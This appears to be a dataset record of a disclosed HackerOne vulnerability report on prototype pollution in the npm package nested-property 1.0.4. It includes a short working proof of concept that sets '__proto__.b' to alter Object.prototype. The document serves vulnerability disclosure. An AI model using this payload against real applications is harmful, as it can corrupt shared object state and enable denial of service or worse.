---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '788883'
original_report_id: '788883'
title: '[nested-property] Prototype Pollution'
weakness: Modification of Assumed-Immutable Data (MAID)
team_handle: nodejs-ecosystem
created_at: '2020-02-04T16:00:49.360Z'
disclosed_at: '2020-10-27T10:54:45.312Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 13
asset_identifier: Other module
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- modification-of-assumed-immutable-data-maid
---

# [nested-property] Prototype Pollution

## Metadata

- HackerOne Report ID: 788883
- Weakness: Modification of Assumed-Immutable Data (MAID)
- Program: nodejs-ecosystem
- Disclosed At: 2020-10-27T10:54:45.312Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi team,
I would like to report a prototype pollution vulnerability in nested-property
that allows an attacker to modify properties on Object.prototype.

Module name:nested-property
version: 1.0.4
npm page: https://www.npmjs.com/package/nested-property

Module Description
Read, write or test a data structure's nested property via a string like 'my.nested.property'. It works through arrays and objects.

 Module Stats

> Replace stats below with numbers from npm’s module page:

[1] weekly downloads :81,395

# Vulnerability

## Vulnerability Description
the vulnerabilty is similar to what  reported in https://hackerone.com/reports/719856
nestedproperty module  is vulnerable when it performs a set operation for nested objects

## Steps To Reproduce:


## Supporting Material/References:

var nestedProperty = require("nested-property");
const object = {};
object.b=true;
console.log("Before " + object.b); // will log true
nestedProperty.set(object, '__proto__.b', false);
console.log("After " + {}.b); // will log false

- [OPERATING SYSTEM VERSION] Ubuntu 16.04
- [NODEJS VERSION]  10.16
- [NPM VERSION] 6.90

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N 

> Hunter's comments and funny memes goes here

https://media1.tenor.com/images/dc2899b4432861e0ce1b9a03d8c98719/tenor.gif

## Impact

This might causes Denial of Service or RCE in some cases

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
